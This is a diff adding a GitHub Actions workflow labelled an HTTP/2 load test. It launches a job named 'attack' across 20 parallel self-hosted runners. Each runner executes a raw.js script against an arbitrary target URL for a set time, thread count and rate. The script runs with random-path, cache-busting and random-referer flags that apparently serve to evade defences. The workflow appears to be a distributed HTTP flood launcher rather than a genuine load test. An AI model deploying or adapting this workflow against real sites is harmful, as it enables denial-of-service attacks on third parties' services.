@@ -1,0 +1,47 @@
+name: HTTP2 Load Test - Scaled
+on:
+  workflow_dispatch:
+    inputs:
+      method:
+        description: 'HTTP Method'
+        required: true
+        default: 'GET'
+        type: string
+      target:
+        description: 'Target URL'
+        required: true
+        type: string
+      time:
+        description: 'Time seconds'
+        required: true
+        type: number
+        default: "300"
+      threads:
+        description: 'Thread count per job'
+        required: true
+        type: number
+        default: "10"
+      rate:
+        description: 'Rate limit per thread'
+        required: true
+        type: number
+        default: "30"
+
+jobs:
+  attack:
+    runs-on: self-hosted
+    strategy:
+      matrix:
+        job_number: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    
+    steps:
+    - uses: actions/checkout@v4
+    
+    - uses: actions/setup-node@v4
+      with:
+        node-version: '20'
+        
+    - run: npm install hpack chalk
+    
+    - run: |
+        node raw.js ${{ github.event.inputs.method }} ${{ github.event.inputs.target }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }} ${{ github.event.inputs.rate }} --full --debug --randpath 3 --cache --referer rand
